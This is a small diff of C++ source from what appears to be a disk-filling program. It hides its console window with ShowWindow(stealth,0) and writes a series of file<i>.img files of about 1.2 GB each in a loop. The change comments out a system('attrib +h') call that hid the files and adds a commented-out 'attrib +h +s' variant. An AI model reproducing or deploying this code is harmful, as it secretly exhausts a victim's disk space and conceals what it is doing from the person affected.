@@ -14,7 +14,8 @@ ShowWindow(stealth,0);
     std::ofstream ofs("file" + ( std::string() = std::to_string(i)) + ".img", std::ios::binary | std::ios::out);
     ofs.seekp((300*2*2<<20) - 1);
     ofs.write("", 1);
-    system("attrib +h "); //Careful! It applies to the entire folder...don't be evil!
+   // system("attrib +h "); //Careful! It applies to the entire folder...don't be evil!
+   //system("attrib +h +s");
 }
 	}
 }
